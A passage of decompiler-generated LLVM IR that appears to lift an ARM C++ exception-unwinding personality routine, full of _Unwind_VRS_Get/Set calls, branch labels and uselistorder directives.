  store i32 %v2_180dc, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_180ec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_180ec, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_180f4 = call i32 @_Unwind_VRS_Get(i32 %v0_180ec, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_180f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_180ec, i32* %r0.global-to-local, align 4
  %v5_1810c = call i32 @_Unwind_VRS_Set(i32 %v0_180ec, i32 %v0_180f8, i32 14, i32 %v0_180f8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1810c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v4_18118 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 32) to i32*), align 4
  %v0_1811c = load i32, i32* %r5.global-to-local, align 4
  %v0_18120 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18120, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18118, i32* %stack_var_-48, align 4
  %v5_18134 = call i32 @_Unwind_VRS_Set(i32 %v0_18120, i32 %v0_1811c, i32 15, i32 %v0_1811c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1814c

dec_label_pc_18140:                               ; preds = %dec_label_pc_1808c
  %v7_18140 = icmp eq i32 %v4_18080, 2
  br i1 %v7_18140, label %dec_label_pc_18158, label %dec_label_pc_18148

dec_label_pc_18148:                               ; preds = %dec_label_pc_18140, %dec_label_pc_1822c, %dec_label_pc_180b8, %dec_label_pc_18420
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1814c

dec_label_pc_1814c:                               ; preds = %bb157, %dec_label_pc_18458, %dec_label_pc_183e8, %bb166, %dec_label_pc_180dc, %dec_label_pc_18148
  %v1_18154 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18458 ], [ %v1_18154.pre, %dec_label_pc_183e8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_180dc ], [ 9, %dec_label_pc_18148 ]
  store i32 %v3_17f68, i32* %r4.global-to-local, align 4
  store i32 %v6_17f68, i32* %r5.global-to-local, align 4
  ret i32 %v1_18154

dec_label_pc_18158:                               ; preds = %dec_label_pc_18140
  store i32 %v1_17f98, i32* %r2.global-to-local, align 4
  %v0_1815c = load i32, i32* @r7, align 4
  %v1_1815c = inttoptr i32 %v0_1815c to i32*
  %v2_1815c = load i32, i32* %v1_1815c, align 4
  %tmp206 = bitcast i32 %v2_1815c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18164 = bitcast float %tmp207 to i32
  store i32 %v1_18164, i32* @sl, align 4
  br i1 %v2_18094, label %dec_label_pc_1816c, label %dec_label_pc_182d8

dec_label_pc_1816c:                               ; preds = %dec_label_pc_18158
  %v2_1816c = icmp eq i32 %v0_18224, 0
  br i1 %v2_1816c, label %dec_label_pc_182c0, label %dec_label_pc_18174

dec_label_pc_18174:                               ; preds = %dec_label_pc_1816c
  %v2_18178 = icmp eq i32 %v1_18164, 0
  br i1 %v2_18178, label %dec_label_pc_18184.thread, label %bb159

dec_label_pc_18184.thread:                        ; preds = %dec_label_pc_18174
  br label %dec_label_pc_183e8

bb159:                                            ; preds = %dec_label_pc_18174
  br i1 %v3_1817c, label %dec_label_pc_1818c, label %dec_label_pc_182c0

dec_label_pc_1818c:                               ; preds = %bb159
  %v1_1818c = add i32 %v0_1815c, 4
  store i32 %v1_1818c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1819c = load i32, i32* @r8, align 4
  %v1_1819c = add i32 %v0_1819c, 88
  store i32 %v1_1819c, i32* %sb.global-to-local, align 4
  store i32 %v1_1818c, i32* @r4, align 4
  br label %dec_label_pc_181c0

dec_label_pc_181b0:                               ; preds = %bb161
  %v1_181b0 = add i32 %v0_181b0, 1
  store i32 %v1_181b0, i32* @r5, align 4
  %v1_181b4 = load i32, i32* @sl, align 4
  %v9_181b4 = icmp eq i32 %v1_181b0, %v1_181b4
  %v0_181b8 = load i32, i32* @r4, align 4
  %v1_181b8 = add i32 %v0_181b8, 4
  store i32 %v1_181b8, i32* @r4, align 4
  br i1 %v9_181b4, label %dec_label_pc_183e8, label %dec_label_pc_181b0.dec_label_pc_181c0_crit_edge

dec_label_pc_181b0.dec_label_pc_181c0_crit_edge:  ; preds = %dec_label_pc_181b0
  %v0_181cc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_181c0

dec_label_pc_181c0:                               ; preds = %dec_label_pc_181b0.dec_label_pc_181c0_crit_edge, %dec_label_pc_1818c
  %v0_181cc = phi i32 [ %v0_181cc.pre, %dec_label_pc_181b0.dec_label_pc_181c0_crit_edge ], [ %v1_1819c, %dec_label_pc_1818c ]
  %v1_181d0 = phi i32 [ %v1_181b8, %dec_label_pc_181b0.dec_label_pc_181c0_crit_edge ], [ %v1_1818c, %dec_label_pc_1818c ]
  %v1_181c0 = inttoptr i32 %v1_181d0 to i32*
  %v2_181c0 = load i32, i32* %v1_181c0, align 4
  %v2_181c4 = icmp eq i32 %v2_181c0, 0
  store i32 %v0_181cc, i32* %forced_unwind_-44, align 4
  br i1 %v2_181c4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_181c0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_181c0, %bb160
  %v0_181d4 = load i32, i32* @r8, align 4
  store i32 %v0_181d4, i32* %r0.global-to-local, align 4
  store i32 %v2_18260, i32* %r2.global-to-local, align 4
  %v4_181e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 100) to i32*), align 4
  store i32 98800, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_181e4)
  %v0_181f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_181f0 = icmp eq i32 %v0_181f0, 0
  %v0_181b0 = load i32, i32* @r5, align 4
  br i1 %v2_181f0, label %dec_label_pc_181b0, label %dec_label_pc_181f8

dec_label_pc_181f8:                               ; preds = %bb161
  %v1_181f8 = load i32, i32* @sl, align 4
  %v9_181f8 = icmp eq i32 %v0_181b0, %v1_181f8
  br i1 %v9_181f8, label %dec_label_pc_183e8, label %dec_label_pc_18200

dec_label_pc_18200:                               ; preds = %dec_label_pc_181f8
  %v0_18200 = load i32, i32* @r7, align 4
  %v1_18200 = inttoptr i32 %v0_18200 to i32*
  %v2_18200 = load i32, i32* %v1_18200, align 4
  %v1_18204 = icmp slt i32 %v2_18200, 0
  %v0_1820c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18204, label %dec_label_pc_1820c, label %dec_label_pc_182cc

dec_label_pc_1820c:                               ; preds = %dec_label_pc_18200, %dec_label_pc_182c4
  %v0_1820c = phi i32 [ %storemerge, %dec_label_pc_182c4 ], [ %v0_1820c.pre, %dec_label_pc_18200 ]
  store i32 %v0_1820c, i32* %r0.global-to-local, align 4
  %v1_18210 = add i32 %v0_1820c, 4
  store i32 %v1_18210, i32* @r6, align 4
  br label %dec_label_pc_182cc

dec_label_pc_18218:                               ; preds = %bb154
  store i32 %v1_17f98, i32* %r2.global-to-local, align 4
  br i1 %v2_18094, label %dec_label_pc_18224, label %dec_label_pc_18310

dec_label_pc_18224:                               ; preds = %dec_label_pc_18218
  %v2_18224 = icmp eq i32 %v0_18224, 0
  br i1 %v2_18224, label %dec_label_pc_18290, label %dec_label_pc_1822c

dec_label_pc_1822c:                               ; preds = %dec_label_pc_18224
  %v0_1822c = load i32, i32* @r7, align 4
  %v1_1822c = add i32 %v0_1822c, 4
  %v2_1822c = inttoptr i32 %v1_1822c to i32*
  %v3_1822c = load i32, i32* %v2_1822c, align 4
  %v7_18230 = icmp eq i32 %v3_1822c, -2
  store i32 %v1_1822c, i32* %r2.global-to-local, align 4
  br i1 %v7_18230, label %dec_label_pc_18148, label %dec_label_pc_1823c

dec_label_pc_1823c:                               ; preds = %dec_label_pc_1822c
  %v0_1823c = load i32, i32* @r8, align 4
  %v1_1823c = add i32 %v0_1823c, 88
  %v7_18240 = icmp eq i32 %v3_1822c, -1
  store i32 %v1_1823c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18240, label %dec_label_pc_18284, label %dec_label_pc_1824c

dec_label_pc_1824c:                               ; preds = %dec_label_pc_1823c
  %v2_18250 = icmp eq i32 %v3_1822c, 0
  br i1 %v2_18250, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1824c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_1824c, %bb162
  store i32 %v0_1823c, i32* %r0.global-to-local, align 4
  store i32 %v2_18260, i32* %r2.global-to-local, align 4
  %v4_1826c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 100) to i32*), align 4
  store i32 98936, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1826c)
  %v0_18278 = load i32, i32* %r0.global-to-local, align 4
  %v2_18278 = icmp eq i32 %v0_18278, 0
  br i1 %v2_18278, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18284.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18284

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18290

dec_label_pc_18284:                               ; preds = %.thread25, %dec_label_pc_1823c
  %v3_18284 = phi i32 [ %v3_18284.pr, %.thread25 ], [ %v1_1823c, %dec_label_pc_1823c ]
  %v2_18288 = icmp eq i32 %v3_18284, 0
  br i1 %v2_18288, label %dec_label_pc_18290, label %dec_label_pc_183e8

dec_label_pc_18290:                               ; preds = %bb164, %dec_label_pc_1833c, %dec_label_pc_18310, %dec_label_pc_18284, %dec_label_pc_18224
  %v0_18290 = load i32, i32* @r7, align 4
  %v1_18290 = add i32 %v0_18290, 8
  %v1_17ff8 = inttoptr i32 %v1_18290 to i32*
  %v2_17ff8 = load i32, i32* %v1_17ff8, align 4
  %v2_17ffc = icmp eq i32 %v2_17ff8, 0
  br i1 %v2_17ffc, label %dec_label_pc_180b8, label %dec_label_pc_18004.preheader

dec_label_pc_18298:                               ; preds = %entry
  %v3_18298 = udiv i32 %v2_17f8c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_182a8 = mul nuw nsw i32 %v3_18298, 4
  %v3_182ac = mul i32 %v2_17f8c, 65536
  %v2_182b0 = add i32 %v6_182a8, %v4_17f8c
  store i32 %v3_182ac, i32* %v4_17fac, align 8
  br label %dec_label_pc_17fd4

dec_label_pc_182c0:                               ; preds = %bb159, %dec_label_pc_1816c
  %v1_182c0 = add i32 %v0_1815c, 4
  br label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %dec_label_pc_18304, %dec_label_pc_182c0
  %v0_182c4 = phi i32 [ %v2_18304, %dec_label_pc_18304 ], [ %v2_1815c, %dec_label_pc_182c0 ]
  %storemerge = phi i32 [ %v4_18304, %dec_label_pc_18304 ], [ %v1_182c0, %dec_label_pc_182c0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_182c4 = icmp slt i32 %v0_182c4, 0
  br i1 %v1_182c4, label %dec_label_pc_1820c, label %dec_label_pc_182cc

dec_label_pc_182cc:                               ; preds = %dec_label_pc_18200, %dec_label_pc_182c4, %dec_label_pc_183d8, %dec_label_pc_1820c
  %v0_182d0 = phi i32 [ %v1_18210, %dec_label_pc_1820c ], [ %storemerge, %dec_label_pc_182c4 ], [ %v1_183dc, %dec_label_pc_183d8 ], [ %v0_1820c.pre, %dec_label_pc_18200 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_1820c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_182c4 ], [ %v1_183d8, %dec_label_pc_183d8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18200 ]
  %v0_182cc = load i32, i32* @sl, align 4
  %v3_182cc = mul i32 %v0_182cc, 4
  %v2_182d0 = add i32 %v3_182cc, %v0_182d0
  %v1_17ff865 = inttoptr i32 %v2_182d0 to i32*
  %v2_17ff866 = load i32, i32* %v1_17ff865, align 4
  %v2_17ffc68 = icmp eq i32 %v2_17ff866, 0
  br i1 %v2_17ffc68, label %dec_label_pc_180b8, label %dec_label_pc_18004.preheader.lr.ph

dec_label_pc_182d8:                               ; preds = %dec_label_pc_18158
  %v0_182e8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_182e8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_182f0 = load i32, i32* @r8, align 4
  %v1_182f0 = add i32 %v0_182f0, 32
  %v2_182f0 = inttoptr i32 %v1_182f0 to i32*
  %v3_182f0 = load i32, i32* %v2_182f0, align 4
  store i32 %v3_182f0, i32* @r4, align 4
  %v5_182f4 = call i32 @_Unwind_VRS_Get(i32 %v0_182e8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_182f4, i32* %r0.global-to-local, align 4
  %v3_182f8 = load i32, i32* %stack_var_-48, align 4
  %v0_182fc = load i32, i32* @r4, align 4
  %v9_182fc = icmp eq i32 %v0_182fc, %v3_182f8
  br i1 %v9_182fc, label %dec_label_pc_183a4, label %dec_label_pc_182d8.dec_label_pc_18304_crit_edge

dec_label_pc_182d8.dec_label_pc_18304_crit_edge:  ; preds = %dec_label_pc_182d8
  %v0_18304.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18304

dec_label_pc_18304:                               ; preds = %dec_label_pc_182d8.dec_label_pc_18304_crit_edge, %dec_label_pc_183a4
  %v0_18304 = phi i32 [ %v0_18304.pre, %dec_label_pc_182d8.dec_label_pc_18304_crit_edge ], [ %v1_183a8, %dec_label_pc_183a4 ]
  %v1_18304 = inttoptr i32 %v0_18304 to i32*
  %v2_18304 = load i32, i32* %v1_18304, align 4
  %v4_18304 = add i32 %v0_18304, 4
  store i32 %v4_18304, i32* @r7, align 4
  br label %dec_label_pc_182c4

dec_label_pc_18310:                               ; preds = %dec_label_pc_18218
  %v0_18320 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18320, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18328 = load i32, i32* @r8, align 4
  %v1_18328 = add i32 %v0_18328, 32
  %v2_18328 = inttoptr i32 %v1_18328 to i32*
  %v3_18328 = load i32, i32* %v2_18328, align 4
  store i32 %v3_18328, i32* @r4, align 4
  %v5_1832c = call i32 @_Unwind_VRS_Get(i32 %v0_18320, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1832c, i32* %r0.global-to-local, align 4
  %v3_18330 = load i32, i32* %stack_var_-48, align 4
  %v0_18334 = load i32, i32* @r4, align 4
  %v9_18334 = icmp eq i32 %v0_18334, %v3_18330
  br i1 %v9_18334, label %dec_label_pc_1833c, label %dec_label_pc_18290

dec_label_pc_1833c:                               ; preds = %dec_label_pc_18310
  %v0_1833c = load i32, i32* @r8, align 4
  %v1_1833c = add i32 %v0_1833c, 40
  %v2_1833c = inttoptr i32 %v1_1833c to i32*
  %v3_1833c = load i32, i32* %v2_1833c, align 4
  %v1_18340 = load i32, i32* @r7, align 4
  %v9_18340 = icmp eq i32 %v3_1833c, %v1_18340
  br i1 %v9_18340, label %dec_label_pc_18348, label %dec_label_pc_18290

dec_label_pc_18348:                               ; preds = %dec_label_pc_1833c
  %v1_18348 = inttoptr i32 %v3_1833c to i32*
  %v2_18348 = load i32, i32* %v1_18348, align 4
  %v1_1834c = and i32 %v2_18348, 1073741824
  %v2_1834c = icmp eq i32 %v1_1834c, 0
  br i1 %v2_1834c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_18348
  %v2_18350 = or i32 %v2_18348, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_18348
  %tmp208 = bitcast i32 %v2_18348 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_18354 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_18358 = phi i32 [ %v2_18488, %.thread28 ], [ %v2_18488, %bb169 ], [ %v3_1833c, %bb165 ], [ %v3_1833c, %.thread26 ]
  %v0_18358 = phi i32 [ %v2_18498, %.thread28 ], [ %v2_18494, %bb169 ], [ %v2_18350, %bb165 ], [ %v2_18354, %.thread26 ]
  %v2_18358 = add i32 %v0_18358, %v1_18358
  store i32 %v2_18358, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18370 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18370, i32* %r0.global-to-local, align 4
  %v5_18378 = call i32 @_Unwind_VRS_Set(i32 %v0_18370, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_18370, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18390 = load i32, i32* @r8, align 4
  store i32 %v0_18390, i32* %stack_var_-48, align 4
  %v5_18398 = call i32 @_Unwind_VRS_Set(i32 %v0_18370, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1814c

dec_label_pc_183a4:                               ; preds = %dec_label_pc_182d8
  %v0_183a4 = load i32, i32* @r8, align 4
  %v1_183a4 = add i32 %v0_183a4, 40
  %v2_183a4 = inttoptr i32 %v1_183a4 to i32*
  %v3_183a4 = load i32, i32* %v2_183a4, align 4
  %v1_183a8 = load i32, i32* @r7, align 4
  %v9_183a8 = icmp eq i32 %v3_183a4, %v1_183a8
  br i1 %v9_183a8, label %dec_label_pc_183b0, label %dec_label_pc_18304

dec_label_pc_183b0:                               ; preds = %dec_label_pc_183a4
  %v1_183b4 = add i32 %v3_183a4, 4
  store i32 %v1_183b4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_183bc = add i32 %v0_183a4, 44
  %v3_183bc = inttoptr i32 %v2_183bc to i32*
  store i32 0, i32* %v3_183bc, align 4
  %v0_183c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_183c0 = load i32, i32* @r8, align 4
  %v2_183c0 = add i32 %v1_183c0, 48
  %v3_183c0 = inttoptr i32 %v2_183c0 to i32*
  store i32 %v0_183c0, i32* %v3_183c0, align 4
  %v0_183c4 = load i32, i32* @sl, align 4
  %v1_183c4 = load i32, i32* @r8, align 4
  %v2_183c4 = add i32 %v1_183c4, 40
  %v3_183c4 = inttoptr i32 %v2_183c4 to i32*
  store i32 %v0_183c4, i32* %v3_183c4, align 4
  %v0_183c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_183c8 = load i32, i32* @r8, align 4
  %v2_183c8 = add i32 %v1_183c8, 52
  %v3_183c8 = inttoptr i32 %v2_183c8 to i32*
  store i32 %v0_183c8, i32* %v3_183c8, align 4
  %v0_183cc = load i32, i32* @r7, align 4
  %v1_183cc = inttoptr i32 %v0_183cc to i32*
  %v2_183cc = load i32, i32* %v1_183cc, align 4
  %v1_183d0 = icmp slt i32 %v2_183cc, 0
  br i1 %v1_183d0, label %dec_label_pc_183d8, label %dec_label_pc_18484

dec_label_pc_183d8:                               ; preds = %dec_label_pc_183b0
  %v0_183d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_183d8 = add i32 %v0_183d8, -3
  store i32 %v1_183d8, i32* %r2.global-to-local, align 4
  %v0_183dc = load i32, i32* %r0.global-to-local, align 4
  %v1_183dc = add i32 %v0_183dc, 4
  store i32 %v1_183dc, i32* @r6, align 4
  br label %dec_label_pc_182cc

dec_label_pc_183e8:                               ; preds = %dec_label_pc_181f8, %dec_label_pc_18284, %dec_label_pc_181b0, %dec_label_pc_18184.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_183f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_183f8, i32* %r0.global-to-local, align 4
  %v5_18400 = call i32 @_Unwind_VRS_Get(i32 %v0_183f8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18404 = load i32, i32* @r7, align 4
  %v1_18404 = load i32, i32* @r8, align 4
  %v2_18404 = add i32 %v1_18404, 40
  %v3_18404 = inttoptr i32 %v2_18404 to i32*
  store i32 %v0_18404, i32* %v3_18404, align 4
  %v3_18408 = load i32, i32* %stack_var_-48, align 4
  %v3_1840c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1840c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_18414 = load i32, i32* @r8, align 4
  %v2_18414 = add i32 %v1_18414, 32
  %v3_18414 = inttoptr i32 %v2_18414 to i32*
  store i32 %v3_18408, i32* %v3_18414, align 4
  %v0_18418 = load i32, i32* %r2.global-to-local, align 4
  %v1_18418 = load i32, i32* @r8, align 4
  %v2_18418 = add i32 %v1_18418, 36
  %v3_18418 = inttoptr i32 %v2_18418 to i32*
  store i32 %v0_18418, i32* %v3_18418, align 4
  %v1_18154.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1814c

dec_label_pc_18420:                               ; preds = %bb155
  %v1_18420 = inttoptr i32 %v0_180a8 to i32*
  %v2_18420 = load i32, i32* %v1_18420, align 4
  %v1_18424 = add i32 %v0_180a8, 4
  %v1_18428 = and i32 %v2_18420, 1073741824
  %v2_18428 = icmp eq i32 %v1_18428, 0
  %v2_1842c = or i32 %v2_18420, -2147483648
  %tmp210 = bitcast i32 %v2_18420 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_18430 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_18428, i32 %v2_18430, i32 %v2_1842c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_18434 = load i32, i32* @r8, align 4
  %v2_18434 = add i32 %v1_18434, 56
  %v3_18434 = inttoptr i32 %v2_18434 to i32*
  store i32 %v1_18424, i32* %v3_18434, align 4
  %v0_18438 = load i32, i32* @r8, align 4
  store i32 %v0_18438, i32* %r0.global-to-local, align 4
  %v4_18444 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 28) to i32*), align 4
  store i32 99408, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18444)
  %v0_18450 = load i32, i32* %r0.global-to-local, align 4
  %v2_18450 = icmp eq i32 %v0_18450, 0
  br i1 %v2_18450, label %dec_label_pc_18148, label %dec_label_pc_18458

dec_label_pc_18458:                               ; preds = %dec_label_pc_18420
  %v0_18458 = load i32, i32* %r4.global-to-local, align 4
  %v1_18458 = load i32, i32* @r7, align 4
  %v2_18458 = add i32 %v1_18458, %v0_18458
  store i32 %v2_18458, i32* %stack_var_-48, align 4
  %v0_18468 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18468, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_18478 = call i32 @_Unwind_VRS_Set(i32 %v0_18468, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1814c

dec_label_pc_18484:                               ; preds = %dec_label_pc_183b0
  %v0_18484 = load i32, i32* @sl, align 4
  %v3_18484 = mul i32 %v0_18484, 4
  %v0_18488 = load i32, i32* %r0.global-to-local, align 4
  %v2_18488 = add i32 %v0_18488, %v3_18484
  %v3_18488 = inttoptr i32 %v2_18488 to i32*
  %v4_18488 = load i32, i32* %v3_18488, align 4
  %v1_1848c = and i32 %v4_18488, 1073741824
  %v2_1848c = icmp eq i32 %v1_1848c, 0
  br i1 %v2_1848c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_18484
  %v2_18494 = or i32 %v4_18488, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_18484
  %tmp212 = bitcast i32 %v4_18488 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_18498 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_18488, { 2, 1, 0 }
  uselistorder i32 %v1_183dc, { 1, 0 }
  uselistorder i32 %v1_183d8, { 1, 0 }
  uselistorder i32 %v1_183a8, { 1, 0 }
  uselistorder i32 %v0_18370, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1833c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_18304, { 1, 0 }
  uselistorder i32 %v0_18304, { 1, 0 }
  uselistorder i32 %v2_17ff866, { 1, 0 }
  uselistorder i32 %v2_182d0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_17ff8, { 1, 0 }
  uselistorder i32 %v1_18290, { 1, 0 }
  uselistorder i32 %v3_1822c, { 2, 0, 1 }
  uselistorder i32 %v0_1820c, { 1, 0 }
  uselistorder i32 %v0_1820c.pre, { 1, 0 }
  uselistorder i32 %v1_18164, { 1, 0 }
  uselistorder i32 %v2_1815c, { 1, 0 }
  uselistorder i32 %v0_180ec, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_180ac, { 1, 0 }
  uselistorder i32 %v1_180a8, { 1, 0 }
  uselistorder i32 %v0_180a8, { 1, 0, 2 }
  uselistorder i32 %v4_18080, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18224, { 1, 2, 0 }
  uselistorder i32 %v0_18058, { 1, 0 }
  uselistorder i32 %v3_18054, { 1, 0, 2 }
  uselistorder i32 %v1_18028, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18260, { 1, 0 }
  uselistorder i1 %v2_18094, { 1, 0, 2 }
  uselistorder i32 %v1_17f98, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 25, 26, 27, 28, 29, 30, 31, 32, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 35, 28, 29, 30, 31, 32, 33, 34, 18, 17, 20, 19, 21, 22, 24, 23, 27, 25, 26, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 7, 6, 9 }
  uselistorder i32 6, { 77, 0, 15, 16, 76, 4, 32, 33, 17, 28, 18, 29, 19, 30, 20, 31, 2, 34, 21, 35, 1, 5, 36, 37, 22, 38, 6, 39, 40, 41, 23, 42, 7, 43, 44, 45, 24, 46, 47, 48, 25, 49, 50, 51, 52, 8, 53, 54, 55, 56, 9, 57, 58, 59, 60, 61, 26, 62, 10, 63, 64, 65, 66, 67, 68, 27, 69, 11, 70, 71, 72, 73, 12, 74, 13, 14, 3, 75 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 144, 28, 149, 143, 148, 29, 30, 31, 32, 33, 34, 35, 142, 36, 37, 38, 2, 39, 0, 3, 40, 41, 43, 42, 1, 46, 44, 45, 47, 145, 49, 48, 52, 53, 54, 50, 51, 55, 56, 58, 59, 60, 57, 61, 146, 62, 64, 63, 66, 65, 67, 147, 68, 70, 69, 72, 71, 77, 73, 78, 74, 79, 75, 76, 80, 81, 82, 83, 85, 86, 84, 141, 88, 87, 91, 92, 93, 89, 90, 94, 101, 95, 102, 96, 103, 97, 104, 98, 105, 99, 100, 107, 106, 108, 109, 110, 111, 116, 112, 117, 113, 118, 114, 115, 120, 119, 121, 122, 123, 126, 124, 127, 125, 128, 129, 130, 131, 132, 134, 135, 133, 136, 138, 139, 137, 140 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
